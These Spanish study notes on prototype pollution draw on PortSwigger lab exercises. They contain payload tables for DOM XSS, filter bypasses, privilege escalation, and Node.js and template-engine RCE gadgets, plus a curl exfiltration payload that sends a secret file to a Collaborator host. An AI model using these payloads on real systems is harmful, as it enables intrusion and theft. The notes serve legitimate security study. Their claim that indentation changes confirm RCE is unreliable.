
---
Tags: #web #json #objetos #propiedades #protoypePollution #burpsuite

---
# 📖 Índice General

- [[#📌 1. Conceptos Base: ¿Qué es Prototype Pollution?]]
    
- [[#⚙️ 2. Funcionamiento Lógico y Arquitectura (El "Por qué")]]
    
- [[#🔍 3. Metodología de Detección (Reconocimiento)]]
    
- [[#💻 4. Prototype Pollution en el Lado Cliente (Client-Side & DOM XSS)]]
    
- [[#🔥 5. Prototype Pollution en el Lado Servidor (Server-Side)]]
    
- [[#🛠️ 6. Técnicas de Explotación en Backend (Tus PoCs)]]
    - [[#6.1. Escalada de Privilegios Administrativos]]
    - [[#6.2. Detección Ciega (Blind) manipulando Códigos de Estado]]
    - [[#6.3. Bypass de Filtros mediante `constructor.prototype`]]
    - [[#6.4. RCE (Remote Code Execution) a través de Procesos Hijos]]
    - [[#6.5. Exfiltración OOB (Out-of-Band) de Datos Sensibles]]
	
- [[#📊 7. Tablas de Referencia: Payloads y Gadgets]]
    
- [[#🛠️ 8. Herramientas de Automatización y Análisis]]
    
- [[#🛡️ 9. Mitigaciones y Defensa en Profundidad]]

# Payloads y Herramientas

[[#🛠️ Herramientas Explicadas al Grano]]
	
[[#💥 1. Tablas de Payloads Detección Inicial (Reconocimiento)]]
	[[#1.1 Detección Vía URL (Query Params & Fragments)]]
	[[#1.2 Detección Vía JSON (Cuerpos de Petición / API REST)]]
	
[[#💻 2. Tablas de Payloads Client-Side (CSPP -> DOM XSS)]]
	
[[#⚙️ 3. Tablas de Payloads Server-Side (SSPP -> RCE & PrivEsc)]]
	[[#3.1 Escalada y Lógica]]
	[[#3.2 RCE Gadgets de Ejecución en Node.js Core]]
	[[#3.3 RCE Motores de Plantillas (Template Engines)]]
	
[[#🐍 4. El "Prototype Pollution" de Python Class Pollution]]
	[[#Payloads de Reconocimiento y Ejecución (Python)]]
	
[[#🔗 Referencias y Recursos]]
	
---

## 📌 1. Conceptos Base: ¿Qué es Prototype Pollution?

**Prototype Pollution** (Contaminación de Prototipos) es una vulnerabilidad crítica y fascinante exclusiva de lenguajes basados en prototipos, fundamentalmente **JavaScript** (tanto en navegadores como en entornos **Node.js**).

Ocurre cuando un atacante logra inyectar o modificar propiedades en el prototipo base global (generalmente `Object.prototype`). Dado que casi todos los objetos en JavaScript heredan de este prototipo raíz, cualquier propiedad añadida allí se **propaga automáticamente** a todos los objetos existentes y futuros de la aplicación, a menos que tengan esa propiedad definida explícitamente.

> **💡 El concepto clave:** En ciberseguridad, a esto le llamamos corromper el "molde" de los objetos. Si envenenas el molde, todos los objetos creados a partir de él nacerán envenenados.

---

## ⚙️ 2. Funcionamiento Lógico y Arquitectura (El "Por qué")

Para entender cómo explotarla, primero debes entender la **Cadena de Prototipos (Prototype Chain)**. En JavaScript, la herencia no es como en Java o C++; aquí los objetos están "encadenados".

### El Mecanismo de Herencia

Cuando intentas acceder a `objeto.propiedad`, el motor de JavaScript sigue este orden de búsqueda:

1. **Instancia propia:** ¿Está la propiedad definida dentro de las llaves `{}` del objeto?
    
2. **Cadena de Prototipos:** Si no está, salta al prototipo del objeto (`objeto.__proto__`).
    
3. **Raíz Global:** Si sigue sin estar, llega al final del túnel: `Object.prototype`.
    
4. **Final:** Si ni siquiera el prototipo base la tiene, devuelve `undefined`.
    

> [!CAUTION] **El "Veneno Global":** Al contaminar `Object.prototype`, estamos inyectando una propiedad en el nivel más alto de la jerarquía. Como casi todos los objetos (Arrays, Funciones, Objetos de configuración) descienden de ahí, todos "verán" tu propiedad inyectada si no tienen una propia con el mismo nombre.

### Los Vectores Mágicos de Acceso (Los "Puentes")

Existen dos formas principales de llegar al prototipo base para contaminarlo:

1. **Directo vía `__proto__`:** Es la referencia directa al prototipo del objeto.
    
    - _Payload:_ `obj.__proto__.vulnerable = true`
        
2. **Vía `constructor.prototype`:** Todo objeto tiene un `constructor` (la función que lo creó). Esa función tiene una propiedad `prototype` que apunta al mismo sitio que `__proto__`.
    
    - _Payload:_ `obj.constructor.prototype.vulnerable = true`
        

### 🧪 Ejemplo Práctico de "Herencia Forzada"

```JavaScript
// Objeto base limpio
let configuracion = {}; 

// Ataque: Contaminamos el prototipo global
let atacante = JSON.parse('{"__proto__": {"debug": true}}');
Object.assign(configuracion, atacante); // Aquí ocurre la magia (vulnerabilidad de merge)

// Verificación en un objeto totalmente diferente y nuevo
let nuevoSistema = {};
console.log(nuevoSistema.debug); // Imprime: true
``````

---

## 🔍 3. Metodología de Detección (Reconocimiento)

Descubrir un Prototype Pollution requiere identificar **Sinks** (sumideros) o funciones vulnerables que realicen copias profundas (deep clone) o fusiones (merge) de objetos sin sanitizar las claves de entrada.

### 3.1. Detección en Caja Blanca (Auditoría de Código)

Busca patrones donde la entrada controlada por el usuario (JSON, parámetros de URL) se pase a funciones recursivas de asignación.

- **Funciones de riesgo:** `Object.assign()`, `lodash.merge()`, `lodash.defaultsDeep()`, `jQuery.extend(true, ...)`, utilidades de parseo como `qs.parse()`.
    

### 3.2. Detección en Caja Negra (Fuzzing y Comportamiento)

Inyecta propiedades inofensivas en la cadena de prototipos y observa si la aplicación cambia su comportamiento o las refleja.

| **<span style="color:#4a90e2">Técnica</span>** | **<span style="color:#4a90e2">Payload de Prueba</span>** | **<span style="color:#4a90e2">Cómo verificar el éxito</span>**                                                                 |
| ---------------------------------------------- | -------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Vía URL (Query Params)**                     | `?__proto__[test]=polluted` o `?__proto__.test=polluted` | Revisa el DOM o la consola del navegador (`Object.prototype.test`) para ver si vale `"polluted"`.                              |
| **Vía JSON Body**                              | `{"__proto__": {"test": "polluted"}}`                    | Igual que el anterior, pero en peticiones API REST.                                                                            |
| **Detección por Reflexión (Server-Side)**      | `{"__proto__":{"json spaces":10}}`                       | Si la respuesta JSON del servidor de repente viene con sangrías de 10 espacios, el prototipo global en Node.js fue envenenado. |

## 🛰️ 3.3. Adaptación del Payload según el Formato (Data Delivery)

Un error común es intentar usar un payload de JSON en una URL o viceversa. La vulnerabilidad depende de cómo el **Parser** interpreta los caracteres especiales.

|**Formato de Entrada**|**Sintaxis del Payload**|**Contexto de Uso**|
|---|---|---|
|**JSON**|`{"__proto__": {"admin": true}}`|APIs REST, cuerpos de peticiones `POST/PUT`. Es el más común y efectivo.|
|**Query Params (URL)**|`?__proto__[admin]=true`|Peticiones `GET`. Común en librerías como `qs` o `query-string`.|
|**Query Params (Dot)**|`?__proto__.admin=true`|Bypass para filtros que buscan corchetes `[]` en la URL.|
|**Form-URL-Encoded**|`admin=true&__proto__[admin]=true`|Formularios HTML clásicos procesados por middlewares como `body-parser`.|
|**Multi-level / Nested**|`{"a": {"__proto__": {"b": 1}}}`|Útil para saltar validaciones que solo revisan el primer nivel de llaves.|
|**Array-based**|`?__proto__[]=val1&__proto__[]=val2`|Inyecta un array en lugar de un string (útil para bypass de sanitizadores como DOMPurify).|

---

## 🛠️ 3.4. Bypasses Avanzados de Evasión

Cuando el desarrollador intenta "limpiar" la entrada, podemos usar estas técnicas de ofuscación:

### A. Codificación (Encoding)

Si el WAF bloquea la cadena `__proto__`, prueba con URL encoding simple o doble:

- **Simple:** `%5f%5fproto%5f%5f`
    
- **Doble:** `%255f%255fproto%255f%255f`
    
- **Unicode:** `\u005f\u005fproto\u005f\u005f` (Solo en cuerpos JSON).
    

### B. Salto de Referencia (Constructor)

Si `__proto__` está totalmente prohibido por código, usamos la cadena de construcción:

- `constructor[prototype][tu_propiedad]=valor`
    
- `a[constructor][prototype][tu_propiedad]=valor`
    

### C. Mutación de Cadenas (The "Pro-Proto" Trick)

Si usan un `replace('__proto__', '')` no recursivo:

- `__pro__proto__to__` -> Al eliminar el centro, se junta el resto y forma la palabra de nuevo.

---

## 💻 4. Prototype Pollution en el Lado Cliente (Client-Side & DOM XSS)

El Client-Side Prototype Pollution suele derivar en un **DOM XSS** (Cross-Site Scripting). Para que sea explotable, necesitas dos cosas:

1. **Fuente (Source):** Un lugar donde puedes inyectar en `Object.prototype` (ej. la URL).
    
2. **Gadget (Sink):** Un fragmento de código legítimo en la aplicación que acceda a una propiedad indefinida de un objeto y la pase a un sumidero peligroso (como `innerHTML`, `eval()`, o `script.src`).
    

A continuación, analizamos tus PoCs (Pruebas de Concepto) clasificadas por técnicas:

### 4.1. Inyección Directa en Elementos del DOM (Gadget de Atributos)

**Tu Caso de Estudio:** `searchLoggerConfigurable.js` y `searchLogger.js`

En estos escenarios, la aplicación parsea los parámetros de la URL y contamina el prototipo. Luego, el código crea un elemento `<script>` y le asigna el origen (`src`) basándose en una propiedad llamada `transport_url`.

**Análisis del Gadget:**

```JavaScript
let config = {params: ...}; // config NO tiene 'transport_url' definido
if(config.transport_url) {  // Si contaminamos Object.prototype.transport_url, esto será TRUE
    let script = document.createElement('script');
    script.src = config.transport_url; // Sumidero XSS
    document.body.appendChild(script);
}
```

- **Payload usado:** `?__proto__[transport_url]=data:,alert(1)`
    
- **Por qué funciona:** Al no existir `transport_url` en `config`, busca en `__proto__` y encuentra tu payload `data:,alert(1)`. El navegador interpreta el esquema `data:` como un script válido y ejecuta el XSS.
    

### 4.2. Evasión de Sintaxis (Vectores Alternativos)

A veces, los WAF (Web Application Firewalls) o el código frontend bloquean el uso de corchetes `[]`.

**Tu Caso de Estudio:** `searchLoggerAlternative.js`

- **Código vulnerable:** `eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');`
    
- **Payload usado:** `?__proto__.sequence=alert(1)-`
    
- **Por qué funciona:** Usas la notación de puntos `.` en lugar de corchetes. El `-` final es brillante: actúa como operador de resta para evitar que la sintaxis de JavaScript se rompa al concatenarse dentro de la función `eval()`, asegurando que `alert(1)` se ejecute limpiamente.
    

### 4.3. Bypass de Sanitización Deficiente (Mutación Recursiva)

Los desarrolladores suelen crear filtros (blocklists) para palabras como `__proto__`. Si este filtro no es recursivo (es decir, no se repite hasta limpiar toda la cadena), se puede bypassear.

**Tu Caso de Estudio:** Función `sanitizeKey(key)` usando `replaceAll`.

- **Código vulnerable:** `key = key.replaceAll('__proto__', '');`
    
- **Payload usado:** `?__pro__proto__to__[transport_url]=data:,alert(0)`
    
- **Por qué funciona:** La función encuentra y elimina el `__proto__` central. Lo que queda de las mitades restantes (`__pro` y `to__`) se une, formando nuevamente la palabra prohibida `__proto__` justo antes de llegar al parser vulnerable. ¡Un clásico error de validación!
    

### 4.4. Gadgets en Librerías de Terceros (Uso de DOM Invader)

Analizar código minificado es tedioso. Librerías enormes o APIs de analíticas suelen tener múltiples sumideros ocultos (gadgets).

**Tu Caso de Estudio:** Uso de DOM Invader para descubrir el gadget `hitCallback`.

- **Payload base:** `#__proto__[hitCallback]=alert(1)`
    
- **Delivery malicioso:** Creaste un exploit real alojado en tu servidor para enviar a la víctima:
    
    ```HTML
    <script>
        location = "https://[ID].web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie);";
    </script>
    ```
    
- **Por qué funciona:** DOM Invader (extensión de PortSwigger para Burp Suite) inyecta payloads de prueba en todas las propiedades posibles y rastrea si alguna termina en sumideros como `setTimeout` o `eval`. Descubrió que una librería de terceros ejecutaba cualquier función pasada a `hitCallback` durante la carga de la página.

---

## 🔥 5. Prototype Pollution en el Lado Servidor (Server-Side)

En el lado del servidor, principalmente en entornos **Node.js**, el impacto es radicalmente mayor. Ya no estamos limitados al navegador de una sola víctima (como en el Client-Side), sino que estamos **envenenando el entorno de ejecución global** de toda la aplicación.

Dado que Node.js es asíncrono y orientado a eventos, múltiples peticiones de usuarios comparten el mismo proceso y la misma memoria. Si contaminas el prototipo global, **todas las peticiones concurrentes y futuras** se verán afectadas hasta que el servidor se reinicie.

> **💡 El Peligro Principal:** Muchas funciones core de Node.js (como `child_process`, `fs`, `http`, o frameworks como `Express.js`) basan su configuración en objetos de opciones. Si estas opciones no se pasan explícitamente, Node.js buscará en la cadena de prototipos. Si hemos inyectado allí nuestra configuración maliciosa... **el servidor la ejecutará como propia**.

---

## 🛠️ 6. Técnicas de Explotación en Backend (Tus PoCs)

A continuación, diseccionamos cada uno de tus ejemplos de laboratorio, que son obras de arte metodológicas para escalar un ataque paso a paso.

### 6.1. Escalada de Privilegios Administrativos

El escenario más directo: inyectar una propiedad que la lógica de negocio evalúe posteriormente.

- **Tu PoC:** En el endpoint `/my-account/change-address`, envías el payload en el JSON:
    
    ```JSON
    {
        "address_line_1":"Wiener HQ",
        ...
        "__proto__":{"isAdmin":true}
    }
    ```
    
- **Análisis de la Explotación:**
    
    1. El servidor recibe este JSON y usa una función vulnerable (como `lodash.merge` o un `Object.assign` inseguro) para actualizar tu dirección en la base de datos.
        
    2. Al procesar el JSON, la clave `__proto__` no se sanitiza y la propiedad `isAdmin: true` se inyecta en `Object.prototype`.
        
    3. Cuando navegas por la aplicación, el middleware de autorización comprueba `if (user.isAdmin)`. Como tu usuario normal no tiene esa propiedad definida, el motor la busca en el prototipo, encuentra `true`, y **¡boom! Tienes acceso de administrador**.
        

### 6.2. Detección Ciega (Blind) manipulando Códigos de Estado

A veces, el servidor **no refleja** las propiedades contaminadas en la respuesta JSON (ej. no ves un `"isAdmin": true` de vuelta). Aquí es donde entra tu técnica de forzar errores.

- **Tu PoC:**
    
    ```JSON
    {"address_line_1":"Wiener HQ", "sessionId":"3Vi...",
    "__proto__":{"status":405}
    }
    // (Nota: Rompes el JSON intencionadamente omitiendo una comilla o coma)
    ```
    
- **¿Por qué funciona esta genialidad?** El framework Express.js utiliza un manejador de errores por defecto. Si forzamos un error de sintaxis en el JSON enviado, Express generará una respuesta de error. Al generar esta respuesta, busca el código de estado HTTP leyendo la propiedad `err.status`. Si no la tiene, busca en el prototipo. Al haber inyectado `{"status": 405}`, el servidor responde con un **405 Method Not Allowed** en lugar del típico 400 o 500, confirmando irrefutablemente la vulnerabilidad de manera ciega.
    

### 6.3. Bypass de Filtros mediante `constructor.prototype`

Si el servidor bloquea la palabra `__proto__`, siempre existe un camino alternativo.

- **Tu PoC:**
    
    ```JSON
    {
        "constructor": {
            "prototype": {
                "isAdmin": "true",
                "json spaces": 10
            }
        }
    }
    ```
    
- **El Gadget Mágico de Express (`json spaces`):** Además de escalar privilegios con `isAdmin`, inyectas `"json spaces": 10`. Express.js lee esta propiedad de configuración global para saber cuántos espacios de sangría aplicar al formatear respuestas JSON. Si la respuesta que recibes de repente tiene **10 espacios de indentación**, acabas de confirmar RCE a nivel de framework.
    

---

### 6.4. RCE (Remote Code Execution) a través de Procesos Hijos

Llegamos al nivel máximo. En Node.js, para ejecutar comandos del sistema, los desarrolladores usan el módulo `child_process` (con funciones como `exec`, `spawn`, `fork`, `execSync`). Estas funciones aceptan un objeto `options`. Si podemos contaminar `Object.prototype` con propiedades que estas funciones esperan, **podemos secuestrar la ejecución**.

#### **¿Cómo descubrir si el backend usa `shell`, `exec` o `fork`?**

No lo sabes a ciencia cierta (caja negra), por lo que debes **fuzzear las opciones** del módulo `child_process` basándote en la documentación de Node.js:

1. **Si usan `fork()` o `spawn()` de Node:** Estas funciones leen la propiedad `execArgv` (Argumentos de ejecución del propio binario de Node.js).
    
    - **Tu PoC:**
        
        ```JSON
        "__proto__": {
            "execArgv":[
                "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
            ]
        }
        ```
        
    - **Mecánica:** Al inyectar `execArgv`, forzamos al nuevo proceso hijo de Node a arrancar con el flag `--eval`, el cual ejecuta el código JavaScript que le pasemos inmediatamente. Esto nos da un RCE directo limpiando el archivo objetivo.
        
2. **Si usan `exec()` o `spawn()` genérico:** Estas funciones leen la propiedad `shell` (para saber qué intérprete usar) y la propiedad `env` (variables de entorno).
    

### 6.5. Exfiltración OOB (Out-of-Band) de Datos Sensibles
Cuando logras RCE pero el resultado del comando no se devuelve en la respuesta HTTP (RCE ciego), necesitas extraer los datos a un servidor externo que tú controlas (como Burp Collaborator).

- **Tu PoC:**
    
    ```JSON
    "__proto__": {
        "shell":"vim",
        "input":":!curl https://[TU_COLLABORATOR].oastify.com/?content=$(cat /home/carlos/secret | base64 | tr -d '\\n')\n"
    }
    ```
    
- **Análisis de este Payload Avanzado:**
    
    1. **`"shell": "vim"`**: Sorprendentemente, le dices a Node.js que el ejecutable para abrir la terminal no sea `/bin/bash`, sino el editor de texto `vim`.
        
    2. **`"input": "..."`**: La propiedad `input` permite pasar datos al `stdin` (entrada estándar) del proceso hijo recién creado.
        
    3. **`:!`**: En `vim`, escribir `:!` permite ejecutar comandos de bash directamente desde el editor.
        
    4. **Exfiltración (`curl + base64`)**: Ejecutas un `cat` al archivo `secret`, lo codificas en `base64` (para evitar problemas de saltos de línea o caracteres raros en la URL) y lo envías como parámetro GET a tu Burp Collaborator. ¡Un ataque quirúrgico perfecto!

---

## 📊 7. Tablas de Referencia: Payloads y Gadgets

Como experto, sabes que la Prototype Pollution por sí sola es solo el "vehículo". El impacto real depende del **Gadget** que logres activar. Aquí tienes una clasificación exhaustiva para Node.js y navegadores.

### 7.1. Payloads por Objetivo y Lenguaje (Contexto Node.js / Browser)

| **<span style="color:#4a90e2">Objetivo</span>** | **<span style="color:#4a90e2">Entorno</span>** | **<span style="color:#4a90e2">Payload (JSON / URL)</span>**     | **<span style="color:#4a90e2">Descripción del Impacto</span>** |
| ----------------------------------------------- | ---------------------------------------------- | --------------------------------------------------------------- | -------------------------------------------------------------- |
| **Detección**                                   | Universal                                      | `{"__proto__": {"polluted": "yes"}}`                            | Verifica si `({}).polluted` devuelve `"yes"`.                  |
| **Escalada**                                    | Server/App                                     | `{"__proto__": {"isAdmin": true}}`                              | Bypass de checks de lógica de negocio.                         |
| **Detección Blind**                             | Node/Express                                   | `{"__proto__": {"json spaces": 10}}`                            | Cambia la indentación visual de la respuesta JSON.             |
| **Detección Blind**                             | Node/Express                                   | `{"__proto__": {"status": 501}}`                                | Cambia el código de estado HTTP en errores.                    |
| **XSS (DOM)**                                   | Browser                                        | `?__proto__[srcdoc][]=<script>alert(1)</script>`                | Útil en gadgets que usen iframes o templates.                  |
| **XSS (DOM)**                                   | Browser                                        | `?__proto__[transport_url]=data:,alert(1)`                      | **(Tu PoC)** Inyecta scripts vía esquemas de datos.            |
| **RCE (Fork)**                                  | Node.js                                        | `{"__proto__": {"execArgv": ["--eval=..."]}}`                   | **(Tu PoC)** Ejecuta JS en procesos hijos.                     |
| **RCE (Shell)**                                 | Node.js                                        | `{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect"}}` | Abre puertos de depuración remota.                             |
| **RCE (Vim)**                                   | Node.js                                        | `{"__proto__": {"shell": "vim", "input": ":!id\n"}}`            | **(Tu PoC)** Usa vim como pasarela de comandos.                |

---

### 7.2. Gadgets Populares en el Ecosistema Node.js

Para explotar RCE en el servidor, debemos conocer qué propiedades "buscan" los módulos internos de Node si no se definen explícitamente:

|**<span style="color:#e67e22">Módulo / Librería</span>**|**<span style="color:#e67e22">Propiedad Gadget</span>**|**<span style="color:#e67e22">Efecto al Contaminar</span>**|
|---|---|---|
|`child_process.spawn`|`shell`|Cambia el binario que ejecuta los comandos (ej. `/bin/sh` -> `/usr/bin/node`).|
|`child_process.spawn`|`argv0`|Manipula el primer argumento enviado al proceso.|
|`child_process.spawn`|`env`|Inyecta variables de entorno (ej. `LD_PRELOAD`) para secuestrar binarios.|
|`child_process.fork`|`execArgv`|Pasa flags al motor V8 (ej. `--icu-data-dir`, `--eval`).|
|`Handlebars` (Template)|`pendingContent`|Inyección de HTML/JS durante el renderizado de plantillas.|
|`Fetch` / `Request`|`headers`|Inyecta headers arbitrarios (como `Authorization`) en peticiones salientes.|

---

## 🛠️ 8. Herramientas de Automatización y Análisis

No siempre podemos analizar miles de líneas de código JS minificado a mano. Estas son las herramientas que mencionas en tus notas, con su función específica:

1. **DOM Invader (PortSwigger):**
    
    - **Uso:** Integrada en el navegador de Burp Suite.
        
    - **Función:** Automatiza la búsqueda de fuentes de contaminación en la URL y rastrea si llegan a sumideros (sinks) peligrosos. Es la herramienta que usaste para descubrir el gadget `hitCallback`.
        
2. **PPScan:**
    
    - **Uso:** Escáner basado en Go/Python.
        
    - **Función:** Realiza fuzzing masivo de parámetros `__proto__` contra listas de sitios web para encontrar vulnerabilidades en masa.
        
3. **Burp Suite (Intruder/Param Miner):**
    
    - **Uso:** Fuzzing de parámetros.
        
    - **Función:** Útil para probar variaciones como `__proto__`, `constructor[prototype]`, o `__pro__proto__to__` de forma automática.
        

---

## 🛡️ 9. Mitigaciones y Defensa en Profundidad

Como profesional reputado, tus informes siempre deben incluir cómo arreglarlo:

- **Uso de Objetos sin Prototipo:** En lugar de `let obj = {}`, usa `let obj = Object.create(null)`. Esto crea un objeto que no hereda de `Object.prototype`, haciéndolo inmune.
    
- **Congelar el Prototipo:** Ejecutar `Object.freeze(Object.prototype)` al inicio de la aplicación impide cualquier modificación posterior. (Cuidado: puede romper algunas librerías antiguas).
    
- **Validación con Esquemas:** Usar **JSON Schema** para validar que las entradas del usuario no contengan claves como `__proto__` o `constructor`.
    
- **Mapas en lugar de Objetos:** Para almacenar datos de usuario (clave-valor), usa la estructura `Map` de ES6, que no es vulnerable a contaminación de prototipos.
    

---

## 🛠️ Herramientas Explicadas al Grano

|**Herramienta**|**Entorno**|**Qué hace y Cómo se usa**|
|---|---|---|
|**DOM Invader**|Cliente (Browser)|Extensión nativa del navegador de Burp Suite. Inyecta un _canary_ (valor único) en las fuentes (URL, hash) y rastrea si ese canary termina ejecutándose en un _sink_ (sumidero) peligroso como `innerHTML` o `eval`. Ideal para cazar gadgets ocultos en el DOM.|
|**Server-Side PP (Burp)**|Servidor (Node)|Extensión de Burp. Escanea automáticamente peticiones. Detecta PP de forma ciega analizando cambios en el comportamiento asíncrono, diferencias de padding en respuestas JSON (`json spaces`) o forzando códigos de error HTTP.|
|**Silent-Spring**|Servidor (Node)|Script/Suite de investigación (yuske). Fuzzea automáticamente aplicaciones Node.js buscando escalar un Prototype Pollution a **RCE** inyectando configuraciones en procesos internos.|
|**PP-Finder / PPScan**|Cliente/Servidor|Scanners standalone. PPScan es ideal para escaneos masivos de listas de URLs (bug bounty). PP-Finder ayuda a mapear las propiedades contaminadas hasta los gadgets.|

---

## 💥 1. Tablas de Payloads: Detección Inicial (Reconocimiento)

El objetivo aquí no es explotar, sino comprobar si el entorno es vulnerable modificando el prototipo de forma inofensiva.

### 1.1 Detección Vía URL (Query Params & Fragments)

Utilizado cuando el backend parsea la URL con librerías vulnerables (ej. `qs` antiguo) o el frontend lee la URL (CSPP).

| **Payload**                              | **Técnica / Variante**                                  |
| ---------------------------------------- | ------------------------------------------------------- |
| `?__proto__[test]=polluted`              | Clásica inyección por corchetes.                        |
| `?__proto__.test=polluted`               | Notación de puntos (evade filtros de corchetes).        |
| `?constructor[prototype][test]=polluted` | Bypass de filtro de palabra `__proto__`.                |
| `?__pro__proto__to__[test]=polluted`     | Bypass de sanitización no recursiva (reemplazo simple). |
| `?%5f%5fproto%5f%5f[test]=polluted`      | URL Encoding de los guiones bajos.                      |
| `#x[__proto__][test]=polluted`           | Inyección en el fragmento (Hash) para Client-Side.      |

### 1.2 Detección Vía JSON (Cuerpos de Petición / API REST)

Utilizado cuando el backend realiza `JSON.parse()` y luego un `merge` o `clone` inseguro.

|**Payload**|**Técnica / Variante**|
|---|---|
|`{"__proto__": {"test": "polluted"}}`|Inyección directa de propiedad mágica.|
|`{"constructor": {"prototype": {"test": "polluted"}}}`|Bypass estándar si se filtra `__proto__`.|
|`{"a": {"__proto__": {"test": "polluted"}}}`|Inyección anidada (bypass de filtros superficiales).|
|`{"__proto__": {"json spaces": 10}}`|**Blind Server-Side:** Si la app usa Express, el JSON de respuesta volverá con 10 espacios de sangría.|
|`{"__proto__": {"status": 510}}`|**Blind Server-Side:** Provoca un error de sintaxis en el body; Express devolverá un HTTP 510.|

_(Nota sobre XML: XML por sí mismo no tiene prototipos. Solo es vulnerable si la app parsea el XML convirtiéndolo a un objeto JSON/JS con librerías como `xml2js` y luego hace un merge)._

---

## 💻 2. Tablas de Payloads: Client-Side (CSPP -> DOM XSS)

El objetivo es inyectar un payload que sea recogido por un _gadget_ (código legítimo de la web) y enviado a un sumidero de ejecución.

|**Contexto del Gadget**|**Payload Ejemplo (JSON o URL)**|**Explicación**|
|---|---|---|
|**Creación de iframes/scripts**|`__proto__[src]=data:,alert(1)`|El gadget lee la propiedad `.src` para crear un elemento.|
|**Renderizado de HTML (innerHTML)**|`__proto__[html]=<img src=x onerror=alert(1)>`|El gadget inserta el contenido de `.html` en el DOM.|
|**Configuraciones de Analíticas**|`__proto__[hitCallback]=alert(1)`|Gadget común en Google Analytics/GTM.|
|**Filtros/Sanitizadores HTML**|`__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src`|Bypass de librerías como DOMPurify si iteran sobre arrays del prototipo.|

---

## ⚙️ 3. Tablas de Payloads: Server-Side (SSPP -> RCE & PrivEsc)

Para Node.js. El objetivo es alterar la configuración del motor o escalar privilegios en la lógica de negocio.

### 3.1 Escalada y Lógica

|**Payload (JSON)**|**Impacto**|
|---|---|
|`{"__proto__": {"isAdmin": true}}`|Bypass de validaciones de roles `if(user.isAdmin)`.|
|`{"__proto__": {"debug": true}}`|Activación de endpoints ocultos o trazas detalladas.|
|`{"__proto__": {"exposedHeaders": ["Authorization"]}}`|Modifica cabeceras CORS de Express.|

### 3.2 RCE: Gadgets de Ejecución en Node.js Core

Estos payloads asumen que el backend llamará en algún momento a funciones de `child_process` (spawn, exec, fork).

|**Módulo Vulnerable**|**Payload (JSON)**|**Descripción**|
|---|---|---|
|`child_process.spawn/exec`|`{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=YOUR_IP:9229"}}`|Obliga a procesos hijos a abrir el puerto de depuración.|
|`child_process.spawn/exec`|`{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}`|Carga variables de entorno como código JS.|
|`child_process.fork`|`{"__proto__": {"execArgv": ["--eval=require('child_process').execSync('id>out.txt')"]}}`|Pasa argumentos de evaluación directa al motor V8.|
|`child_process` + `vim`|`{"__proto__": {"shell": "vim", "input": ":!id\n"}}`|Forzar el uso de vim como shell y pasarle comandos por stdin.|

### 3.3 RCE: Motores de Plantillas (Template Engines)

Si el servidor usa motores de plantillas, a menudo confían en opciones de compilación que no están protegidas.

|**Motor**|**Payload (JSON)**|
|---|---|
|**EJS**|`{"__proto__": {"client": 1, "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id')"}}`|
|**Handlebars**|`{"__proto__": {"pendingContent": "<script>alert(1)</script>"}}` (Suele derivar en XSS reflejado persistente).|
|**Pug**|`{"__proto__": {"pretty": "; process.mainModule.require('child_process').exec('id');"}}`|

---

## 🐍 4. El "Prototype Pollution" de Python: Class Pollution

En Python no hay prototipos, pero todo es un objeto. Si una aplicación (típicamente al combinar diccionarios recursivamente o renderizar plantillas como **Jinja2**) permite sobrescribir atributos mágicos de clase (`__class__`, `__init__`, `__globals__`), podemos alterar el comportamiento global.

### Payloads de Reconocimiento y Ejecución (Python)

|**Objetivo**|**Payload (JSON / Dict Injection)**|**Descripción**|
|---|---|---|
|**Bypass Simple**|`{"__class__": {"__init__": {"__globals__": {"isAdmin": true}}}}`|Inyecta la variable en el espacio de nombres global del módulo.|
|**Sobrescribir Config**|`{"__class__": {"__init__": {"__globals__": {"app": {"config": {"SECRET_KEY": "hacked"}}}}}}`|Altera secretos de Flask.|
|**RCE (vía subprocess)**|`{"__class__": {"__init__": {"__globals__": {"os": {"environ": {"LD_PRELOAD": "malicious.so"}}}}}}`|Envenenamiento de entorno si usa `os.system` o similar.|
|**Jinja2 SSTI (análogo)**|`{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}`|Leer archivos iterando sobre la jerarquía de clases base.|

---

## 🔗 Referencias y Recursos

Para profundizar en la investigación de nuevos gadgets y técnicas, consulta siempre estas fuentes:

> [!IMPORTANT]
> 
> **Fuentes de Consulta Obligada:**
> 
> 1. [PayloadsAllTheThings - Prototype Pollution Gadgets](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution#prototype-pollution-gadgets) - El diccionario más completo de payloads y gadgets.
>     
> 2. [HackTricks - Prototype Pollution to RCE](https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.html) - Guía detallada de explotación en entornos Node.js.
>     
> 3. [PortSwigger Academy - Prototype Pollution](https://portswigger.net/web-security/prototype-pollution) - Laboratorios interactivos y teoría de vanguardia.
>     
